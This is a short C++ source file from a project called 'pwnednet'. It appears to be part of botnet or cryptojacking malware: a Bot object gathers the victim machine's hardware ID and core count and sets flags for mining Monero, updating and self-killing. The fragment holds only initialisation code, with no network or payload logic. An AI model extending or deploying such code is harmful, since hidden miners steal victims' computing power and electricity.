//
//  bot.cpp
//  pwnednet
//
/*
 
 
 
 
 
 */

#include "bot.h"

Bot* bot    = new Bot();

void Bot::init() {
    
    bot->hwid       = "";
    bot->hwid       = Util::GetHWID();
    bot->cores      = Util::GetCores();
    
    bot->shouldmine = false;
    bot->update     = false;
    bot->kill       = false;
    
    bot->coin       = "xmr";
    
}
